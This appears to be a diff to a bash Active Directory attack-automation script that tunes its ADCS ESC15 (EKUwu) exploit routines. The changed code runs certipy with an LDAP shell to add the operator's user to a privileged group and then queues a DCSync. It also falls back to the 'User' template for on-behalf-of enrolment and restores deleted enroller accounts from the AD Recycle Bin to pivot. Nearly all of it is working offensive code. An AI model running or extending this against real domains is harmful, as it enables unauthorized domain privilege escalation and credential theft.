@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.17.3"
+readonly VERSION="1.17.4"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -1958,7 +1958,9 @@ _adcs_esc15_exploit() {                  # _adcs_esc15_exploit <ca> <v1tpl> <obo
     run "certipy auth -pfx $apfx -dc-ip $DC_IP -ldap-shell  « add_user_to_group $USER '$grp'"
     local lout; lout=$( cd "$OUTDIR" && printf 'add_user_to_group %s "%s"\nexit\n' "$USER" "$grp" | \
         "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy auth -pfx "$apfx" -dc-ip "$DC_IP" -ldap-shell 2>&1 ); echo "$lout" | tee -a "$LOGFILE"
-    if grep -qiE 'added .*to|successfully|adding user|modify(ied)? .*succe' <<<"$lout"; then
+    # the ldap-shell prints 'result: OK' (or 'Successfully ...') only on a real add;
+    # the 'Adding user: …' banner prints even on failure — don't match on it.
+    if grep -qiE 'result:[[:space:]]*(ok|0)\b|successfully (added|modified)|succeeded' <<<"$lout"; then
         rb_record "ESC15-A: added $USER to '$grp' via Schannel LDAP" \
                   "echo 'Manual: remove $USER from $grp (bloodyAD remove groupMember \"$grp\" $USER)'"
         loot "★★★ ESC15 (EKUwu/Schannel) → ${C_BOLD}${USER}${C_RESET} added to '${grp}' — re-queueing for DCSync"
@@ -1992,7 +1994,9 @@ _adcs_esc15_blind() {
     [[ -z "$tpls" ]] && { info "  no v1 Enrollee-Supplies-Subject template → ESC15 not applicable here"; return 1; }
     # The on-behalf-of target for scenario B (prefer the stock 'User' template).
     local catpls; catpls=$(_adcs_clientauth_tpl "$full")
-    local obo; obo=$(grep -ixF 'User' <<<"$catpls" | head -1); [[ -z "$obo" ]] && obo=$(head -1 <<<"$catpls")
+    local obo; obo=$(grep -ixF 'User' <<<"$catpls" | head -1)
+    [[ -z "$obo" ]] && obo=$(head -1 <<<"$catpls")
+    [[ -z "$obo" ]] && obo="User"   # stock client-auth template — almost always present
     local t n=0
     while IFS= read -r t; do
         [[ -z "$t" ]] && continue
@@ -2003,7 +2007,11 @@ _adcs_esc15_blind() {
     # All v1+ESS templates were denied — the real enroller may be a DELETED account
     # whose SID is in the enrol ACE (certipy couldn't resolve it). Cross-reference
     # the SIDs in the template enum with the AD Recycle Bin and restore the match.
-    _adcs_restore_enroller "$(grep -oiE 'S-1-5-21-[0-9-]+' <<<"$full" | sort -u)" && return 0
+    # NB: restoring the enroller is a PIVOT (it queues a new identity to run ESC15
+    # AS), NOT an escalation to Administrator — so we must NOT return success here,
+    # or the caller sets ADCS_PWNED=1 and the restored identity's own ADCS phase is
+    # skipped (it can enrol → it's the one that actually completes EKUwu).
+    _adcs_restore_enroller "$(grep -oiE 'S-1-5-21-[0-9-]+' <<<"$full" | sort -u)"
     return 1
 }
 
@@ -2036,6 +2044,7 @@ _abuse_adcs() {
             ESC9|ESC10|ESC16) _adcs_req_admin "$ca" "$tpl" "$esc" 0 && return 0 ;;  # missing SID extension → UPN map
             ESC15) local _obo; _obo=$(_adcs_clientauth_tpl "$cout" | grep -ixF 'User' | head -1)
                    [[ -z "$_obo" ]] && _obo=$(_adcs_clientauth_tpl "$cout" | head -1)
+                   [[ -z "$_obo" ]] && _obo="User"
                    _adcs_esc15_exploit "$ca" "$tpl" "$_obo" && return 0 ;;
             ESC3)  _adcs_esc3  "$ca" "$tpl" && return 0 ;;
             ESC4)  _adcs_esc4  "$ca" "$tpl" && return 0 ;;
